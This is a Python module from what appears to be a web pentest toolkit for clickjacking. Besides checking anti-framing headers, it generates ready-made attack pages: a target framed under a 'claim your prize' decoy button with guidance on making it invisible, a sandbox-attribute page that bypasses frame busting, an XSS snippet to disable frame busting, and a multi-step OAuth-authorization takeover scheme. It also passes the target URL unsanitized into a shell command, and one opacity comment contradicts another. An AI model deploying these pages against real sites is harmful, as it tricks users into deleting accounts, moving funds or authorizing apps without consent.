"""
modules/clickjacking.py
tmrswrr - Clickjacking / UI Redressing
Frame busting bypass, CSP frame-ancestors, PoC generator
"""
import os

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    NEON_CYN,
    NEON_GRN,
    PURE_WHITE,
    RST,
    SOFT_WHITE,
    info,
    print_banner,
    prompt,
    run_cmd,
    section,
    success,
    warn,
)


def _out(name):
    d = str(OUTPUT_DIR); os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target():
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL"); SESSION["target_url"] = url
    return url


def detect_clickjacking():
    section("CLICKJACKING DETECTION")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-H "Cookie: {cookies}"' if cookies else ""

    info("Checking X-Frame-Options and Content-Security-Policy frame-ancestors...")
    out, _, _ = run_cmd(f'curl -sk -I {cookie_flag} {url} -L -m 10')
    print(f"\n{NEON_CYN}Headers:{RST}")
    print(out[:1000])

    lower = out.lower()

    # Check X-Frame-Options
    xfo_match = __import__("re").search(r"x-frame-options:\s*(.+)", out, __import__("re").I)
    if xfo_match:
        xfo = xfo_match.group(1).strip().upper()
        if "DENY" in xfo:
            success("X-Frame-Options: DENY - not frameable")
        elif "SAMEORIGIN" in xfo:
            success("X-Frame-Options: SAMEORIGIN - only same origin can frame")
        elif "ALLOW-FROM" in xfo:
            warn(f"X-Frame-Options: {xfo} - limited protection (IE only)")
            add_vuln("Weak X-Frame-Options (ALLOW-FROM)", "Medium", "A05:2021",
                     "ALLOW-FROM only works in IE - other browsers ignore it", url)
    else:
        warn("X-Frame-Options: MISSING")
        add_vuln("Missing X-Frame-Options", "Medium", "A05:2021",
                 "No X-Frame-Options header - may be frameable", url)

    # Check CSP frame-ancestors
    import re
    csp_match = re.search(r"content-security-policy:\s*(.+)", out, re.I)
    if csp_match:
        csp = csp_match.group(1)
        if "frame-ancestors" in csp.lower():
            fa_match = re.search(r"frame-ancestors\s+([^;]+)", csp, re.I)
            if fa_match:
                fa = fa_match.group(1).strip()
                if fa == "'none'":
                    success("CSP frame-ancestors: 'none' - strong protection")
                elif fa == "'self'":
                    success("CSP frame-ancestors: 'self' - same-origin only")
                else:
                    warn(f"CSP frame-ancestors: {fa} - check if too permissive")
        else:
            warn("CSP present but no frame-ancestors directive")
    else:
        warn("No Content-Security-Policy header")

    # Actually try to frame it
    info("Testing if target can actually be framed in browser...")
    poc_path = generate_poc(url, auto=True)
    info(f"PoC saved → {poc_path}")
    info(f"Open in browser: firefox {poc_path}")


def generate_poc(url=None, auto=False):
    section("CLICKJACKING PoC GENERATOR")
    if not url:
        url = _target()

    action_desc = prompt("What action should victim click? (e.g. 'Delete Account', 'Transfer Funds')") if not auto else "Sensitive Action"
    action_url  = prompt("Target endpoint for the action (e.g. /account/delete)") if not auto else ""

    target_url = (url + action_url) if action_url else url

    poc = f"""<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking PoC - YeepForge</title>
  <style>
    body {{ font-family: Arial, sans-serif; margin: 40px; }}
    h2 {{ color: #cc0000; }}
    .container {{ position: relative; width: 900px; height: 600px; }}
    iframe {{
      position: absolute; top: 0; left: 0;
      width: 900px; height: 600px;
      border: 1px solid #ccc;
      opacity: 0.5; /* Increase to 1.0 for stealth attack */
      z-index: 2;
    }}
    .decoy {{
      position: absolute;
      top: 300px; left: 400px; /* Adjust to overlay the real button */
      z-index: 3;
      cursor: pointer;
      background: #007bff; color: white;
      padding: 10px 20px; border: none;
      font-size: 16px; border-radius: 4px;
      pointer-events: none; /* Let clicks pass through to iframe */
    }}
    .info {{ background: #fff3cd; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
  </style>
</head>
<body>
  <h2>⚠ Clickjacking PoC - {action_desc}</h2>
  <div class="info">
    <strong>Target:</strong> {target_url}<br>
    <strong>Attack:</strong> Victim thinks they're clicking "{action_desc}"<br>
    <strong>Reality:</strong> They're clicking a button on the framed page<br>
    <strong>Opacity:</strong> Set to 0 (invisible) for real attack
  </div>

  <div class="container">
    <iframe src="{target_url}" scrolling="no"></iframe>
    <button class="decoy">Click to claim your prize!</button>
  </div>

  <script>
    // Check if framing succeeded
    var iframe = document.querySelector('iframe');
    iframe.onload = function() {{
      try {{
        var content = iframe.contentWindow.document;
        document.title = 'Clickjacking CONFIRMED - Frame loaded';
        console.log('Frame loaded successfully - clickjacking is possible!');
      }} catch(e) {{
        document.title = 'Clickjacking BLOCKED - ' + e.message;
        console.log('Frame blocked (X-Frame-Options or CSP):', e.message);
      }}
    }};
  </script>
</body>
</html>"""

    out_file = _out("clickjacking_poc.html")
    with open(out_file, "w") as f:
        f.write(poc)
    if not auto:
        success(f"PoC saved → {out_file}")
        info(f"Open with: firefox {out_file}")
    return out_file


def frame_busting_bypass():
    section("FRAME BUSTING SCRIPT BYPASS")
    print(f"""
  {NEON_CYN}Frame Busting Bypass Techniques:{RST}

  {NEON_GRN}[1] sandbox attribute (most effective):{RST}
    <iframe src="TARGET" sandbox="allow-forms allow-scripts allow-same-origin">
    → Disables frame busting JS while keeping forms functional

  {NEON_GRN}[2] Double-iframe bypass:{RST}
    Parent iframes the attacker page, attacker iframes target
    Browser allows child frame to break out of parent, NOT grandparent

  {NEON_GRN}[3] Redirect after framing:{RST}
    Frame target page, then redirect parent to keep frame alive
    <iframe src=TARGET onload="top.location=TARGET">

  {NEON_GRN}[4] XSS to disable frame busting:{RST}
    If target has XSS, inject JS to nullify frame busting code:
    window.onbeforeunload = function() {{ return false; }}

  {NEON_GRN}[5] Mobile / touch interface bypass:{RST}
    Some frame busting only checks desktop events
    Touch events (touchstart) bypass keyboard checks

  {NEON_CYN}PoC with sandbox bypass:{RST}
""")
    url = _target()
    poc_sandbox = f"""<html>
<body>
  <h3>Sandbox bypass PoC</h3>
  <iframe src="{url}" sandbox="allow-forms allow-scripts allow-same-origin"
          width="900" height="600">
  </iframe>
</body>
</html>"""
    out_file = _out("clickjacking_sandbox_poc.html")
    with open(out_file, "w") as f:
        f.write(poc_sandbox)
    success(f"Sandbox bypass PoC → {out_file}")


def multi_step_clickjacking():
    section("MULTI-STEP CLICKJACKING")
    print(f"""
  {NEON_CYN}Multi-step Clickjacking (account takeover):{RST}

  Attack: guide victim through multiple click positions to complete
  a multi-step action (e.g. authorize OAuth app, confirm account deletion)

  {NEON_GRN}Example targeting "Authorize Application" flow:{RST}
    Step 1: Show "Click here to continue" (overlays "Next" button)
    Step 2: Show "Confirm your choice" (overlays "Authorize" button)
    Result: OAuth app authorized without victim's knowledge

  {NEON_GRN}Drag-and-Drop Clickjacking (drag text out of iframe):{RST}
    Works even with X-Frame-Options in some old browsers
    1. User drags "interesting" element (appears to be a game)
    2. They're actually dragging sensitive data out of iframe
    3. Dropped into attacker-controlled input field

  {NEON_CYN}Tools:{RST}
    Clickjacking Tester: https://clickjacker.io
    Proxy tool (Clickbandit)
""")


def run():
    print_banner("CLICKJACKING / UI REDRESSING",
                 "Frame Detection · PoC Generator · Frame Busting Bypass")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} Detect Clickjacking Vulnerability {SOFT_WHITE}(headers + PoC){RST}
  {NEON_CYN}[2]{RST} Generate Clickjacking PoC          {SOFT_WHITE}(customizable HTML){RST}
  {NEON_CYN}[3]{RST} Frame Busting Bypass               {SOFT_WHITE}(sandbox, double-iframe){RST}
  {NEON_CYN}[4]{RST} Multi-Step Clickjacking            {SOFT_WHITE}(account takeover chain){RST}
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0": break
        elif c == "1": detect_clickjacking()
        elif c == "2": generate_poc()
        elif c == "3": frame_busting_bypass()
        elif c == "4": multi_step_clickjacking()
        save_session()
